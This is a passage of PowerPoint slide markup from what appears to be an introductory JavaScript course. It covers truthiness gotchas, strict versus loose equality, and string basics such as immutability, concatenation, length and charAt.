              <a:t>1</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="AF00DB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>if</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="098658"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>0</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yes</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a:t>
            </a:r>
            <a:br>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="AF00DB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>else</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"no"</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no</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="fi-FI" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="AF00DB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>if</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="098658"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>1</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yes</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yes</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="fi-FI" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="AF00DB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>if</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="098658"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>2</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yes</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yes</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="fi-FI" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="098658"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>0</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true</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false</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="fi-FI" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="098658"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>1</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true</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true</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="fi-FI" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="098658"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>2</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false</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false</a:t>
            </a:r>
            <a:endParaRPr lang="fi-FI" sz="2400" b="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" dirty="0">
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>It is better to use strict === and !== instead of == and !=</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" altLang="fi-FI"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9B07B4DA-CC91-4724-9AA1-F9D4020E3E42}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI"/>
              <a:t>More Truth Value Gotchas</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{BD5C9EB1-331B-4B0C-9698-2CE368BDDC7F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1271588" y="1196975"/>
            <a:ext cx="10080625" cy="5472113"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>Functions returning Boolean can be used directly</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="400050" lvl="1"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isPalindrome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s</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true</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redundant</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800" b="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="400050" lvl="1"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isPalindrome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s</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more succinct</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800" b="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="400050" lvl="1"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valid</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s</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false</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redundant</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800" b="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="400050" lvl="1"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valid</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s</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better</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="285750"/>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>Do not mix Booleans with string, as the results are very confusing (hint: JS converts both the Boolean and string into number before comparison)</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="AF00DB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>if</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true</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yes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no</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="fi-FI" sz="1800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="AF00DB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>if</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false</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yes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yes</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="fi-FI" sz="1800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="AF00DB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>if</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true</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yes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no</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="fi-FI" sz="1800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="AF00DB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>if</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false</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yes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no</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="fi-FI" sz="1800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
            </a:b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false</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'0'</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true</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="fi-FI" sz="1800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
            </a:b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true</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'1'</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true</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="fi-FI" sz="1800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
            </a:b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true</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'2'</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false</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="fi-FI" sz="1800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
            </a:b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00FF"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>null</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> == </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>undefined</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true</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="fi-FI" sz="1800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
            </a:b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 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="EE0000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>\t\r\n</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 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="098658"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>0</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true</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="fi-FI" sz="1800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
            </a:b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 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="098658"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>0</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true</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
            </a:br>
            <a:endParaRPr lang="en-US" sz="1800" dirty="0">
              <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1800" dirty="0">
              <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buNone/>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1800" dirty="0">
              <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              <a:cs typeface="Courier New" panose="020703090202050204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Otsikko 1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{45ACAC77-E40B-45B1-AF05-6625D2ABF89D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" dirty="0"/>
              <a:t>Strings</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Sisällön paikkamerkki 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{374714D2-AB5E-4D72-9FE6-A23D5C4C52A8}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="609600" y="1600200"/>
            <a:ext cx="10972800" cy="4781128"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr rtlCol="0">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Strings are immutable and Unicode</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>You can use either single (') or double (") quotes</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
            </a:b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s</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"Jack"</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s2</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'Jill'</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>;</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" b="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FFFFFF"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>Empty string is defined like this:</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="001080"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>empty</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empty2</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endParaRPr lang="fi-FI" sz="2000" b="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FFFFFF"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>+ concatenates strings</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
            </a:b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s</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Hello</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 "</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"World"</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>;</a:t>
            </a:r>
            <a:endParaRPr lang="fi-FI" sz="2000" b="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FFFFFF"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>Use one-character strings to represent one character</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>length attribute tells the length of the string</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="001080"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>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length</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11</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0">
              <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>String indexes are numbers, starting from 0:</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
            </a:b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first</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="001080"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>s</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>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charAt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first</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="001080"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>s</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alternative way</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
            </a:b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s</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>[0] = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="A31515"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>"a"</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ERROR! Assignment not possible as string are immutable</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" b="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin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isällön paikkamerkki 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{EE972BBE-B7A1-41E3-8C27-B548E34A86DF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="609600" y="1600200"/>
            <a:ext cx="10972800" cy="4997152"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial" charset="0"/>
              <a:buChar char="•"/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0"/>
              <a:t>charAt(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" i="1" dirty="0"/>
              <a:t>x)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>returns the character at position </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" i="1" dirty="0"/>
              <a:t>x</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial" charset="0"/>
              <a:buChar char="•"/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0"/>
